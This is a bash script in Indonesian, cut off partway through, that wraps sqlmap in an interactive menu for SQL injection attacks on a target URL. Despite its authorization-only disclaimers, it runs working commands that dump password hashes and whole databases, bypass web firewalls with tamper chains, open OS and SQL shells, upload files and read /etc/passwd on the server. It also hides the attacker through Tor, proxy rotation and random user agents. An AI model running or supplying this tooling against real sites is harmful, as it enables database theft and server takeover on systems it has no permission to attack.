#!/usr/bin/env bash
# =============================================================================
# SQLMAP_SHEET by Pixel_Detective
# =============================================================================
# Author  : Pixel_Detective
# Build   : 2026-11-12
# Version : 3.2 (Termux-ready)
# License : MIT — for authorized penetration testing only
#
# PERINGATAN ETIS:
#   Gunakan HANYA pada target yang Anda miliki atau memiliki IZIN TERTULIS
#   (scope/RoE). Pengujian tanpa izin = ilegal (UU ITE, CFAA, RA 10175, dll.)
# =============================================================================
# Fitur:
#   - Setup sesi interaktif (URL manual, GET/POST, cookie, header, -r request)
#   - Deteksi dasar, enumerasi DB, teknik spesifik, WAF bypass, eskalasi
#   - Submenu DUMP lengkap + FULL DUMP (--dump-all)
#   - SQL query kustom (--sql-query/--sql-file)
#   - Proxy & anonymizer (Burp/Tor/UA/file proxy)
#   - Advanced flags (parse-errors/smart/hex/dbms/csrf/eval)
#   - Session save/load (~/.sqlmap_sheet_session)
#   - Export laporan (Markdown/TXT) + log perintah
#   - Cek dependency otomatis (sqlmap, python3, curl)
#   - Mode batch non-interaktif untuk pipeline
#   - Kompatibel Termux (Android): auto-detect, path $HOME, wake-lock
# =============================================================================
# Cara pakai:
#   chmod +x sqlmap_sheet.sh
#   ./sqlmap_sheet.sh            # menu interaktif
#   ./sqlmap_sheet.sh --help     # bantuan
#   ./sqlmap_sheet.sh --check    # cek dependency
#   ./sqlmap_sheet.sh --load     # muat sesi terakhir
#   ./sqlmap_sheet.sh --batch-run <url> [detect|enum|full]
# =============================================================================

set -euo pipefail

# -----------------------------------------------------------------------------
# Identitas tool
# -----------------------------------------------------------------------------
readonly VERSION="3.2"
readonly TOOL_NAME="SQLMAP_SHEET"
readonly AUTHOR="Pixel_Detective"
readonly SCRIPT_NAME="$(basename "$0")"

# -----------------------------------------------------------------------------
# Deteksi environment (Termux / Linux / macOS)
# -----------------------------------------------------------------------------
IS_TERMUX=0
if [[ -n "${PREFIX:-}" && "$PREFIX" == *"com.termux"* ]]; then
  IS_TERMUX=1
fi

readonly IS_TERMUX
readonly SESSION_FILE="${HOME}/.sqlmap_sheet_session"
readonly LOG_FILE="${HOME}/.sqlmap_sheet.log"
readonly DEFAULT_REQUEST_FILE="request.txt"

# -----------------------------------------------------------------------------
# State global
# -----------------------------------------------------------------------------
TARGET_URL=""
TARGET_METHOD="GET"
TARGET_DATA=""
TARGET_COOKIE=""
TARGET_HEADERS=""
REQUEST_FILE=""
OUTPUT_DIR=""
DUMP_DIR=""
LEVEL=1
RISK=1
THREADS=1
VERBOSE=1
TIME_SEC=5
DBMS=""
TECHNIQUE=""
USER_AGENT=""
PROXY=""
TOR=0
CSRF_TOKEN=""
CSRF_URL=""
EVAL_EXPR=""
USE_RANDOM_AGENT=1
USE_PARSE_ERRORS=1
USE_SMART=0
USE_KEEP_ALIVE=0
USE_HEX=0
EXTRA_ARGS=""
FLUSH_ONCE=0
WAKE_LOCKED=0

# -----------------------------------------------------------------------------
# Warna & simbol
# -----------------------------------------------------------------------------
if [[ -t 1 ]]; then
  C_RED=$'\033[31m'; C_GRN=$'\033[32m'; C_YEL=$'\033[33m'
  C_BLU=$'\033[34m'; C_MAG=$'\033[35m'; C_CYN=$'\033[36m'
  C_BLD=$'\033[1m'; C_DIM=$'\033[2m'; C_RST=$'\033[0m'
else
  C_RED=""; C_GRN=""; C_YEL=""; C_BLU=""; C_MAG=""
  C_CYN=""; C_BLD=""; C_DIM=""; C_RST=""
fi
readonly OK="${C_GRN}✔${C_RST}"
readonly WARN="${C_YEL}⚠${C_RST}"
readonly ERR="${C_RED}✘${C_RST}"
readonly INFO="${C_CYN}ℹ${C_RST}"

# ASCII art banner (SQLMAP)
readonly ART_BANNER=$'\033[36m
   ██████╗ ██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗
  ██╔════╝██╔═══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
  ███████╗██║   ██║██║     ██╔████╔██║███████║██████╔╝
  ╚════██║██║▄▄ ██║██║     ██║╚██╔╝██║██╔══██║██╔═══╝
  ███████║╚██████╔╝███████╗██║ ╚═╝ ██║██║  ██║██║
  ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝
\033[0m'
readonly TAGLINE=$'\033[90m        ── SQLMap Interactive Cheat Sheet ──\033[0m'
readonly CREDIT=$'\033[33m              by Pixel_Detective\033[0m'
readonly ART_FALLBACK=$'\033[36m  ┌──────────────────────────────┐
  │  SQLMAP_SHEET by Pixel_Detective  │
  └──────────────────────────────┘\033[0m'

# -----------------------------------------------------------------------------
# Logging
# -----------------------------------------------------------------------------
log() {
  local level="$1"; shift
  printf '[%s] [%s] [%s] %s\n' \
    "$(date '+%Y-%m-%d %H:%M:%S')" "$AUTHOR" "$level" "$*" >> "$LOG_FILE" || true
}

# -----------------------------------------------------------------------------
# Termux wake-lock (agar proses tidak dimatikan saat layar mati)
# -----------------------------------------------------------------------------
acquire_wake_lock() {
  if [[ "$IS_TERMUX" == "1" && "$WAKE_LOCKED" == "0" ]]; then
    if command -v termux-wake-lock >/dev/null 2>&1; then
      termux-wake-lock 2>/dev/null && WAKE_LOCKED=1 || true
    fi
  fi
}

release_wake_lock() {
  if [[ "$IS_TERMUX" == "1" && "$WAKE_LOCKED" == "1" ]]; then
    if command -v termux-wake-unlock >/dev/null 2>&1; then
      termux-wake-unlock 2>/dev/null || true
    fi
    WAKE_LOCKED=0
  fi
}

cleanup() {
  release_wake_lock
  log "INFO" "Cleanup done"
}

trap cleanup EXIT INT TERM

# -----------------------------------------------------------------------------
# Terminal width helper (fallback untuk layar sempit Termux)
# -----------------------------------------------------------------------------
term_cols() {
  local c
  c="$(tput cols 2>/dev/null || echo 80)"
  [[ -z "$c" || "$c" -lt 20 ]] && c=80
  printf '%s' "$c"
}

render_art() {
  local cols; cols="$(term_cols)"
  if (( cols >= 62 )); then
    printf '%s\n' "${ART_BANNER}"
    printf '%s\n' "${TAGLINE}"
    printf '%s\n' "${CREDIT}"
  else
    printf '%s\n' "${ART_FALLBACK}"
    printf '%s\n' "${TAGLINE}"
    printf '%s\n' "${CREDIT}"
  fi
}

# -----------------------------------------------------------------------------
# Dependency check
# -----------------------------------------------------------------------------
check_deps() {
  local ok=1
  if command -v sqlmap >/dev/null 2>&1; then
    echo "  ${OK} sqlmap        : $(sqlmap --version 2>/dev/null | head -n1 || echo unknown)"
  else
    echo "  ${ERR} sqlmap        : TIDAK DITEMUKAN"
    if [[ "$IS_TERMUX" == "1" ]]; then
      echo "      Install (Termux): pkg install python && pip install sqlmap"
    else
      echo "      Install: sudo apt install sqlmap  atau  pip install sqlmap"
    fi
    ok=0
  fi
  for bin in python3 curl; do
    if command -v "$bin" >/dev/null 2>&1; then
      echo "  ${OK} $bin$(printf '%*s' $((14-${#bin})) '') : $(command -v "$bin")"
    else
      echo "  ${WARN} $bin$(printf '%*s' $((14-${#bin})) '') : tidak ada (opsional)"
    fi
  done
  if [[ "$IS_TERMUX" == "1" ]]; then
    echo "  ${INFO} Environment  : Termux (Android)"
    command -v termux-wake-lock >/dev/null 2>&1 \
      && echo "  ${OK} termux-wake-lock : tersedia" \
      || echo "  ${WARN} termux-wake-lock : tidak ada (pkg install termux-api)"
  fi
  [[ $ok -eq 1 ]]
}

# -----------------------------------------------------------------------------
# UI
# -----------------------------------------------------------------------------
banner() {
  echo
  render_art
  echo
  printf '%s\n' "${C_BLD}╔══════════════════════════════════════════════════════════════╗${C_RST}"
  printf '%s\n' "${C_BLD}║  $1${C_RST}"
  printf '%s\n' "${C_BLD}╚══════════════════════════════════════════════════════════════╝${C_RST}"
}

signature() {
  echo
  printf '%s\n' "${C_DIM}──────────────────────────────────────────────────────────────${C_RST}"
  printf '  %s %s v%s — by %s\n' "${C_CYN}▸${C_RST}" "$TOOL_NAME" "$VERSION" "$AUTHOR"
  [[ "$IS_TERMUX" == "1" ]] && printf '  %s Termux mode · wake-lock %s\n' "${C_DIM}" "$([[ $WAKE_LOCKED == 1 ]] && echo ON || echo OFF)"
  printf '  %s Authorized pentest only. No warranty.\n' "${C_DIM}"
  printf '%s\n' "${C_DIM}──────────────────────────────────────────────────────────────${C_RST}"
}

hr() { printf '%s\n' "${C_DIM}──────────────────────────────────────────────────────────────${C_RST}"; }
section() { echo; printf '%s\n' "${C_MAG}▶ $1${C_RST}"; hr; }

run_cmd() {
  echo
  printf '%s\n' "${C_CYN}┌─ CMD ────────────────────────────────────────────────────────${C_RST}"
  printf '%s %s\n' "${C_CYN}│${C_RST}" "$*"
  printf '%s\n' "${C_CYN}└──────────────────────────────────────────────────────────────${C_RST}"
  log "CMD" "$*"
  "$@" || {
    local rc=$?
    printf '%s exit=%d\n' "${WARN}" "$rc"
    log "WARN" "exit=$rc :: $*"
  }
}

ask() {
  local prompt="$1" def="${2:-}" silent="${3:-}" val
  if [[ "$silent" == "silent" ]]; then
    read -rsp "$prompt${def:+ [$def]}: " val; echo
  else
    read -rp "$prompt${def:+ [$def]}: " val
  fi
  printf '%s' "${val:-$def}"
}

confirm() {
  local prompt="$1" expected="$2" ans
  read -rp "$prompt (ketik '$expected'): " ans
  [[ "$ans" == "$expected" ]]
}

ask_range() {
  local prompt="$1" def="$2" min="$3" max="$4" val
  while true; do
    val="$(ask "$prompt ($min-$max)" "$def")"
    if [[ "$val" =~ ^[0-9]+$ ]] && (( val >= min && val <= max )); then
      printf '%s' "$val"; return
    fi
    echo "  ${ERR} Harus angka $min-$max." >&2
  done
}

# -----------------------------------------------------------------------------
# Session
# -----------------------------------------------------------------------------
save_session() {
  {
    echo "TARGET_URL=$TARGET_URL"
    echo "TARGET_METHOD=$TARGET_METHOD"
    echo "TARGET_DATA=$TARGET_DATA"
    echo "TARGET_COOKIE=$TARGET_COOKIE"
    echo "TARGET_HEADERS=$TARGET_HEADERS"
    echo "REQUEST_FILE=$REQUEST_FILE"
    echo "OUTPUT_DIR=$OUTPUT_DIR"
    echo "DUMP_DIR=$DUMP_DIR"
    echo "LEVEL=$LEVEL"; echo "RISK=$RISK"; echo "THREADS=$THREADS"
    echo "VERBOSE=$VERBOSE"; echo "TIME_SEC=$TIME_SEC"
    echo "DBMS=$DBMS"; echo "TECHNIQUE=$TECHNIQUE"
    echo "USER_AGENT=$USER_AGENT"; echo "PROXY=$PROXY"; echo "TOR=$TOR"
    echo "CSRF_TOKEN=$CSRF_TOKEN"; echo "CSRF_URL=$CSRF_URL"
    echo "EVAL_EXPR=$EVAL_EXPR"
    echo "USE_RANDOM_AGENT=$USE_RANDOM_AGENT"
    echo "USE_PARSE_ERRORS=$USE_PARSE_ERRORS"
    echo "USE_SMART=$USE_SMART"; echo "USE_KEEP_ALIVE=$USE_KEEP_ALIVE"
    echo "USE_HEX=$USE_HEX"; echo "EXTRA_ARGS=$EXTRA_ARGS"
  } > "$SESSION_FILE"
  chmod 600 "$SESSION_FILE" 2>/dev/null || true
  echo "  ${OK} Sesi disimpan: $SESSION_FILE"
  log "INFO" "Session saved"
}

load_session() {
  if [[ -f "$SESSION_FILE" ]]; then
    # shellcheck disable=SC1090
    source "$SESSION_FILE"
    echo "  ${OK} Sesi dimuat: $SESSION_FILE"
    log "INFO" "Session loaded"
    show_session
    return 0
  fi
  echo "  ${WARN} Tidak ada sesi tersimpan."
  return 1
}

show_session() {
  echo
  printf '%s\n' "${C_BLD}  ── Sesi Aktif ──${C_RST}"
  printf '  %s URL      : %s\n' "${INFO}" "${TARGET_URL:-<belum diset>}"
  printf '  %s Metode   : %s\n' "${INFO}" "$TARGET_METHOD"
  [[ -n "$TARGET_DATA"    ]] && printf '  %s Data     : %s\n' "${INFO}" "$TARGET_DATA"
  [[ -n "$TARGET_COOKIE"  ]] && printf '  %s Cookie   : (set, %d chars)\n' "${INFO}" "${#TARGET_COOKIE}"
  [[ -n "$TARGET_HEADERS" ]] && printf '  %s Header   : (set)\n' "${INFO}"
  [[ -n "$REQUEST_FILE"   ]] && printf '  %s Request  : %s\n' "${INFO}" "$REQUEST_FILE"
  printf '  %s Level    : %s\n' "${INFO}" "$LEVEL"
  printf '  %s Risk     : %s\n' "${INFO}" "$RISK"
  printf '  %s Threads  : %s\n' "${INFO}" "$THREADS"
  printf '  %s Verbose  : %s\n' "${INFO}" "$VERBOSE"
  printf '  %s Time-sec : %s\n' "${INFO}" "$TIME_SEC"
  [[ -n "$DBMS"      ]] && printf '  %s DBMS     : %s\n' "${INFO}" "$DBMS"
  [[ -n "$TECHNIQUE" ]] && printf '  %s Teknik   : %s\n' "${INFO}" "$TECHNIQUE"
  [[ -n "$PROXY"     ]] && printf '  %s Proxy    : %s\n' "${INFO}" "$PROXY"
  [[ "$TOR" == "1"   ]] && printf '  %s Tor      : ON\n' "${INFO}"
  [[ -n "$CSRF_TOKEN" ]] && printf '  %s CSRF     : %s -> %s\n' "${INFO}" "$CSRF_TOKEN" "$CSRF_URL"
  printf '  %s Output   : %s\n' "${INFO}" "${OUTPUT_DIR:-<belum diset>}"
  printf '  %s Dump     : %s\n' "${INFO}" "${DUMP_DIR:-<belum diset>}"
}

# -----------------------------------------------------------------------------
# Setup sesi
# -----------------------------------------------------------------------------
setup_session() {
  acquire_wake_lock
  banner "SETUP SESI — Masukkan target (harus dalam scope izin)"

  while true; do
    TARGET_URL="$(ask 'URL target (mis. https://site/page.php?id=1)')"
    [[ -z "$TARGET_URL" ]] && { echo "  ${ERR} URL wajib."; continue; }
    if [[ "$TARGET_URL" != http*://* ]]; then
      echo "  ${WARN} URL sebaiknya diawali http(s)://"
      read -rp "  Lanjutkan? [y/N]: " yn
      [[ "${yn,,}" == "y" ]] || continue
    fi
    break
  done

  local m
  read -rp "Metode [GET/POST] (default GET): " m
  m="${m:-GET}"; m="${m^^}"; TARGET_METHOD="$m"
  if [[ "$m" == "POST" ]]; then
    TARGET_DATA="$(ask 'Data POST (mis. user=a&pass=b)')"
  fi

  TARGET_COOKIE="$(ask 'Cookie (opsional)' '' silent)"
  TARGET_HEADERS="$(ask 'Header kustom (opsional)' '' silent)"

  local rf
  rf="$(ask 'File request Burp/ZAP (opsional)' "$DEFAULT_REQUEST_FILE")"
  if [[ -n "$rf" && -f "$rf" ]]; then REQUEST_FILE="$rf"; else REQUEST_FILE=""; fi

  LEVEL="$(ask_range 'Level' '1' 1 5)"
  RISK="$(ask_range 'Risk' '1' 1 3)"
  THREADS="$(ask_range 'Threads' '1' 1 20)"
  VERBOSE="$(ask_range 'Verbose' '1' 0 6)"
  TIME_SEC="$(ask_range 'Time-sec (detik)' '5' 1 60)"

  local host ts base
  host="$(echo "$TARGET_URL" | awk -F/ '{print $3}' | tr ':' '_')"
  ts="$(date '+%Y%m%d_%H%M%S')"
  base="sqlmap_${host:-target}_${ts}"

  if [[ "$IS_TERMUX" == "1" ]]; then
    OUTPUT_DIR="$(ask 'Output dir' "$HOME/sqlmap_out/$base")"
    DUMP_DIR="$(ask 'Dump dir'   "$HOME/sqlmap_dump/$base")"
  else
    OUTPUT_DIR="$(ask 'Output dir' "./out/$base")"
    DUMP_DIR="$(ask 'Dump dir'   "./dump/$base")"
  fi
  mkdir -p "$OUTPUT_DIR" "$DUMP_DIR"

  echo
  echo "  ${INFO} Pre-check WAF (opsional, tekan Enter untuk lewati)..."
  read -rp "  Jalankan WAF pre-check? [y/N]: " wp
  if [[ "${wp,,}" == "y" ]]; then
    mapfile -t A < <(base_args_core)
    section "WAF pre-check"
    run_cmd sqlmap "${A[@]}" --parse-errors
  fi

  FLUSH_ONCE=1
  echo
  echo "  ${OK} Sesi siap."
  show_session

  read -rp "  Simpan sesi? [Y/n]: " s
  [[ "${s,,}" != "n" ]] && save_session || true
}

# -----------------------------------------------------------------------------
# Base args builder
# -----------------------------------------------------------------------------
base_args_core() {
  local args=(--batch --output-dir="$OUTPUT_DIR")

  if [[ "$FLUSH_ONCE" == "1" ]]; then
    args+=(--flush-session); FLUSH_ONCE=0
  fi

  [[ "$USE_RANDOM_AGENT" == "1" ]] && args+=(--random-agent)
  [[ "$USE_PARSE_ERRORS" == "1" ]] && args+=(--parse-errors)
  [[ "$USE_SMART"       == "1" ]] && args+=(--smart)
  [[ "$USE_KEEP_ALIVE"  == "1" ]] && args+=(--keep-alive)

  [[ "$LEVEL"   != "1" ]] && args+=(--level="$LEVEL")
  [[ "$RISK"    != "1" ]] && args+=(--risk="$RISK")
  [[ "$THREADS" != "1" ]] && args+=(--threads="$THREADS")
  [[ "$VERBOSE" != "1" ]] && args+=(-v "$VERBOSE")

  [[ -n "$DBMS"      ]] && args+=(--dbms="$DBMS")
  [[ -n "$TECHNIQUE" ]] && args+=(--technique="$TECHNIQUE")
  [[ -n "$USER_AGENT" ]] && args+=(--user-agent="$USER_AGENT")
  [[ -n "$PROXY"     ]] && args+=(--proxy="$PROXY")
  [[ "$TOR" == "1"   ]] && args+=(--tor --check-tor)
  [[ -n "$CSRF_TOKEN" ]] && args+=(--csrf-token="$CSRF_TOKEN")
  [[ -n "$CSRF_URL"   ]] && args+=(--csrf-url="$CSRF_URL")
  [[ -n "$EVAL_EXPR"  ]] && args+=(--eval="$EVAL_EXPR")
  [[ "$USE_HEX" == "1" ]] && args+=(--hex)

  if [[ -n "$REQUEST_FILE" ]]; then
    args+=(-r "$REQUEST_FILE")
  elif [[ "$TARGET_METHOD" == "POST" ]]; then
    args+=(-u "$TARGET_URL" --data="$TARGET_DATA")
  else
    args+=(-u "$TARGET_URL")
  fi

  [[ -n "$TARGET_COOKIE"  ]] && args+=(--cookie="$TARGET_COOKIE")
  [[ -n "$TARGET_HEADERS" ]] && args+=(--headers="$TARGET_HEADERS")
  [[ -n "$EXTRA_ARGS"     ]] && read -ra _extra <<< "$EXTRA_ARGS" && args+=("${_extra[@]}")
  printf '%s\n' "${args[@]}"
}

# -----------------------------------------------------------------------------
# 1. DETEKSI DASAR
# -----------------------------------------------------------------------------
detect_basic() {
  banner "1. DETEKSI DASAR"
  mapfile -t A < <(base_args_core)
  run_cmd sqlmap "${A[@]}"
}

# -----------------------------------------------------------------------------
# 2. ENUMERASI INFO DB
# -----------------------------------------------------------------------------
enum_db() {
  banner "2. ENUMERASI INFO DB"
  mapfile -t A < <(base_args_core)
  section "Banner & user"
  run_cmd sqlmap "${A[@]}" --banner --current-user --current-db --is-dba
  section "Daftar database"
  run_cmd sqlmap "${A[@]}" --dbs
  section "Hash password user DB"
  run_cmd sqlmap "${A[@]}" --passwords
}

# -----------------------------------------------------------------------------
# 3. ENUMERASI TABEL/KOLOM/DATA
# -----------------------------------------------------------------------------
enum_tables() {
  banner "3. ENUMERASI TABEL/KOLOM/DATA"
  local db tbl cols
  db="$(ask 'Database')"
  [[ -z "$db" ]] && { echo "  ${ERR} Database wajib."; return; }
  mapfile -t A < <(base_args_core)

  section "Tabel di '$db'"
  run_cmd sqlmap "${A[@]}" -D "$db" --tables

  tbl="$(ask 'Tabel (kosongkan untuk berhenti)')"
  [[ -z "$tbl" ]] && return

  section "Kolom di '$db.$tbl'"
  run_cmd sqlmap "${A[@]}" -D "$db" -T "$tbl" --columns

  cols="$(ask 'Kolom (opsional, pisah koma)')"
  section "Dump data"
  if [[ -n "$cols" ]]; then
    run_cmd sqlmap "${A[@]}" -D "$db" -T "$tbl" -C "$cols" --dump --threads="$THREADS"
  else
    run_cmd sqlmap "${A[@]}" -D "$db" -T "$tbl" --dump --threads="$THREADS"
  fi
}

# -----------------------------------------------------------------------------
# 4. TEKNIK SPESIFIK
# -----------------------------------------------------------------------------
technique_specific() {
  banner "4. TEKNIK SPESIFIK"
  echo "  B=boolean  E=error  U=union  S=stacked  T=time  Q=inline"
  local tech
  tech="$(ask 'Teknik (mis. UT, T, E, B)' "${TECHNIQUE:-UT}")"
  TECHNIQUE="$tech"
  mapfile -t A < <(base_args_core)
  run_cmd sqlmap "${A[@]}" --technique="$tech"
  if [[ "$tech" == *T* ]]; then
    local secs
    secs="$(ask_range 'Time-sec' "$TIME_SEC" 1 60)"
    TIME_SEC="$secs"
    run_cmd sqlmap "${A[@]}" --technique="$tech" --time-sec="$secs"
  fi
}

# -----------------------------------------------------------------------------
# 5. WAF BYPASS
# -----------------------------------------------------------------------------
waf_bypass() {
  banner "5. WAF BYPASS (TAMPER)"
  cat <<EOF
    1) space2comment
    2) space2comment,between,randomcase
    3) cloudflare2025
    4) awswaf2026
    5) custom (pisah koma)
    6) agresif (space2comment,randomcase + level 5 + risk 3)
    7) chain panjang (space2comment,randomcase,charencode,between)
EOF
  local p tamper
  p="$(ask 'Pilih [1-7]' '1')"
  case "$p" in
    1) tamper="space2comment" ;;
    2) tamper="space2comment,between,randomcase" ;;
    3) tamper="cloudflare2025" ;;
    4) tamper="awswaf2026" ;;
    5) tamper="$(ask 'Tamper (pisah koma)')" ;;
    6) tamper="space2comment,randomcase"; LEVEL=5; RISK=3
       echo "  ${WARN} Level=5 Risk=3 diaktifkan." ;;
    7) tamper="space2comment,randomcase,charencode,between" ;;
    *) echo "  ${ERR} Tidak valid."; return ;;
  esac
  mapfile -t A < <(base_args_core)
  run_cmd sqlmap "${A[@]}" --tamper="$tamper"
}

# -----------------------------------------------------------------------------
# 6. ESKALASI
# -----------------------------------------------------------------------------
escalate() {
  banner "6. ESKALASI — HANYA DENGAN IZIN EKSPLISIT"
  echo "  ${WARN} Aksi ini membaca/mengubah file di server target."
  confirm "  Ketik 'YA' untuk lanjut" "YA" || { echo "  Dibatalkan."; return; }

  cat <<EOF
    1) Baca file (--file-read)
    2) OS command (--os-cmd)
    3) OS shell (--os-shell)
    4) SQL shell (--sql-shell)
    5) Upload file (--file-write + --file-dest)
EOF
  local p
  p="$(ask 'Pilih [1-5]')"
  mapfile -t A < <(base_args_core)
  case "$p" in
    1) local f; f="$(ask 'Path file' '/etc/passwd')"
       run_cmd sqlmap "${A[@]}" --file-read="$f" ;;
    2) local cmd; cmd="$(ask 'Perintah' 'whoami')"
       run_cmd sqlmap "${A[@]}" --os-cmd="$cmd" ;;
    3) run_cmd sqlmap "${A[@]}" --os-shell ;;
    4) run_cmd sqlmap "${A[@]}" --sql-shell ;;
    5) local src dst; src="$(ask 'File lokal')"; dst="$(ask 'Path tujuan di server')"
       echo "  ${WARN} Upload file bisa meninggalkan artefak. Hapus setelah uji."
       confirm "  Ketik 'UPLOAD' untuk lanjut" "UPLOAD" || return
       run_cmd sqlmap "${A[@]}" --file-write="$src" --file-dest="$dst" ;;
    *) echo "  ${ERR} Tidak valid." ;;
  esac
}

# -----------------------------------------------------------------------------
# 7. FULL WORKFLOW
# -----------------------------------------------------------------------------
full_workflow() {
  banner "7. FULL WORKFLOW (deteksi → enumerasi → dump)"
  mapfile -t A < <(base_args_core)
  section "Fingerprint"
  run_cmd sqlmap "${A[@]}" --banner --current-user --current-db --is-dba
  section "Daftar database"
  run_cmd sqlmap "${A[@]}" --dbs
  local db
  db="$(ask 'Database (kosongkan untuk berhenti)')"
  [[ -z "$db" ]] && return
  section "Tabel di '$db'"
  run_cmd sqlmap "${A[@]}" -D "$db" --tables
  local tbl
  tbl="$(ask 'Tabel (kosongkan untuk berhenti)')"
  [[ -z "$tbl" ]] && return
  section "Dump '$db.$tbl'"
  run_cmd sqlmap "${A[@]}" -D "$db" -T "$tbl" --dump --threads="$THREADS"
}

# -----------------------------------------------------------------------------
# 8. DUMP
# -----------------------------------------------------------------------------
dump_all_dbs() {
  banner "8a. DUMP — SEMUA DATABASE"
  mapfile -t A < <(base_args_core)
  run_cmd sqlmap "${A[@]}" --dbs
}
dump_all_tables() {
  banner "8b. DUMP — SEMUA TABEL"
  local db; db="$(ask 'Database')"
  [[ -z "$db" ]] && { echo "  ${ERR} wajib."; return; }
  mapfile -t A < <(base_args_core)
  run_cmd sqlmap "${A[@]}" -D "$db" --tables
}
dump_all_columns() {
  banner "8c. DUMP — SEMUA KOLOM"
  local db tbl
  db="$(ask 'Database')"; tbl="$(ask 'Tabel')"
  [[ -z "$db" || -z "$tbl" ]] && { echo "  ${ERR} wajib."; return; }
  mapfile -t A < <(base_args_core)
  run_cmd sqlmap "${A[@]}" -D "$db" -T "$tbl" --columns
}
dump_table_data() {
  banner "8d. DUMP — SEMUA DATA SATU TABEL"
  local db tbl
  db="$(ask 'Database')"; tbl="$(ask 'Tabel')"
  [[ -z "$db" || -z "$tbl" ]] && { echo "  ${ERR} wajib."; return; }
  mapfile -t A < <(base_args_core)
  run_cmd sqlmap "${A[@]}" -D "$db" -T "$tbl" --dump --threads="$THREADS"
}
dump_everything() {
  banner "8e. FULL DUMP — SEMUA DB/TABEL/DATA"
  echo "  ${ERR} PERINGATAN:${C_RST} dump seluruh isi database."
  confirm "  Ketik 'DUMP-ALL' untuk lanjut" "DUMP-ALL" || { echo "  Dibatalkan."; return; }
  local only; only="$(ask 'Batasi ke database (kosong = semua)')"
  mapfile -t A < <(base_args_core)
  if [[ -n "$only" ]]; then
    run_cmd sqlmap "${A[@]}" -D "$only" --dump-all --exclude-sysdbs --threads="$THREADS"
  else
    run_cmd sqlmap "${A[@]}" --dump-all --exclude-sysdbs --threads="$THREADS"
  fi
}
dump_filtered() {
  banner "8f. DUMP — KOLOM + FILTER WHERE"
  local db tbl cols where
  db="$(ask 'Database')"; tbl="$(ask 'Tabel')"
  cols="$(ask 'Kolom (mis. username,password)')"
  where="$(ask 'Kondisi WHERE (mis. id>5)')"
  [[ -z "$db" || -z "$tbl" ]] && { echo "  ${ERR} wajib."; return; }
  mapfile -t A < <(base_args_core)
  local extra=()
  [[ -n "$cols"  ]] && extra+=(-C "$cols")
  [[ -n "$where" ]] && extra+=(--where="$where")
  run_cmd sqlmap "${A[@]}" -D "$db" -T "$tbl" "${extra[@]}" --dump --threads="$THREADS"
}
dump_search() {
  banner "8g. CARI TABEL/KOLOM"
  cat <<EOF
    1) Cari tabel (--search -T)
    2) Cari kolom (--search -C)
EOF
  local p term
  p="$(ask 'Pilih [1-2]' '1')"; term="$(ask 'Kata kunci')"
  [[ -z "$term" ]] && { echo "  ${ERR} wajib."; return; }
  mapfile -t A < <(base_args_core)
  case "$p" in
    1) run_cmd sqlmap "${A[@]}" --search -T "$term" ;;
    2) run_cmd sqlmap "${A[@]}" --search -C "$term" ;;
    *) echo "  ${ERR} Tidak valid." ;;
  esac
}
menu_dump() {
  while true; do
    banner "SUBMENU — DUMP"
    cat <<EOF
  ${C_CYN}a)${C_RST} Dump semua database (nama)
  ${C_CYN}b)${C_RST} Dump semua tabel dari database
  ${C_CYN}c)${C_RST} Dump semua kolom dari tabel
  ${C_CYN}d)${C_RST} Dump semua data dari satu tabel
  ${C_CYN}e)${C_RST} FULL DUMP — semua DB/tabel/data ${C_RED}(hati-hati)${C_RST}
  ${C_CYN}f)${C_RST} Dump kolom spesifik + filter WHERE
  ${C_CYN}g)${C_RST} Cari tabel/kolom berdasarkan nama
  ${C_CYN}k)${C_RST} Kembali ke menu utama
EOF
    read -rp "  ${C_CYN}${AUTHOR} ▸${C_RST} " choice
    case "$choice" in
      a) dump_all_dbs ;; b) dump_all_tables ;; c) dump_all_columns ;;
      d) dump_table_data ;; e) dump_everything ;; f) dump_filtered ;;
      g) dump_search ;; k|K) return ;;
      *) echo "  ${ERR} Pilihan tidak valid." ;;
    esac
  done
}

# -----------------------------------------------------------------------------
# 9. SQL QUERY KUSTOM
# -----------------------------------------------------------------------------
sql_query_menu() {
  banner "9. SQL QUERY KUSTOM"
  cat <<EOF
    1) Query langsung (--sql-query)
    2) Dari file (--sql-file)
    3) Baca file di server (--file-read)
EOF
  local p
  p="$(ask 'Pilih [1-3]' '1')"
  mapfile -t A < <(base_args_core)
  case "$p" in
    1) local q; q="$(ask 'Query (mis. SELECT version())')"
       [[ -z "$q" ]] && return
       run_cmd sqlmap "${A[@]}" --sql-query="$q" ;;
    2) local f; f="$(ask 'File SQL lokal')"
       [[ -f "$f" ]] || { echo "  ${ERR} File tidak ada."; return; }
       run_cmd sqlmap "${A[@]}" --sql-file="$f" ;;
    3) local rf; rf="$(ask 'Path file di server' '/etc/passwd')"
       run_cmd sqlmap "${A[@]}" --file-read="$rf" ;;
    *) echo "  ${ERR} Tidak valid." ;;
  esac
}

# -----------------------------------------------------------------------------
# 10. PROXY & ANONIMIZER
# -----------------------------------------------------------------------------
proxy_menu() {
  banner "10. PROXY & ANONIMIZER"
  cat <<EOF
    1) Set proxy (mis. http://127.0.0.1:8080 untuk Burp)
    2) Set proxy dari file (rotasi)
    3) Toggle Tor
    4) Set User-Agent kustom
    5) Toggle --random-agent
    0) Kembali
EOF
  local p
  p="$(ask 'Pilih [0-5]' '0')"
  case "$p" in
    1) PROXY="$(ask 'Proxy URL' 'http://127.0.0.1:8080')"
       echo "  ${OK} proxy=$PROXY" ;;
    2) local pf; pf="$(ask 'File proxy (satu per baris)')"
       if [[ -f "$pf" ]]; then PROXY="$pf"; echo "  ${OK} proxy-file=$pf"; else echo "  ${ERR} File tidak ada."; fi ;;
    3) [[ "$TOR" == "1" ]] && TOR=0 || TOR=1
       echo "  ${OK} tor=$([[ $TOR == 1 ]] && echo ON || echo OFF)" ;;
    4) USER_AGENT="$(ask 'User-Agent')"; echo "  ${OK} UA set." ;;
    5) [[ "$USE_RANDOM_AGENT" == "1" ]] && USE_RANDOM_AGENT=0 || USE_RANDOM_AGENT=1
       echo "  ${OK} random-agent=$([[ $USE_RANDOM_AGENT == 1 ]] && echo ON || echo OFF)" ;;
    0) return ;;
    *) echo "  ${ERR} Tidak valid." ;;
  esac
}

# -----------------------------------------------------------------------------
# 11. ADVANCED FLAGS
# -----------------------------------------------------------------------------
advanced_flags() {
  banner "11. ADVANCED FLAGS"
  cat <<EOF
    1) Toggle --parse-errors  (sekarang: $([[ $USE_PARSE_ERRORS == 1 ]] && echo ON || echo OFF))
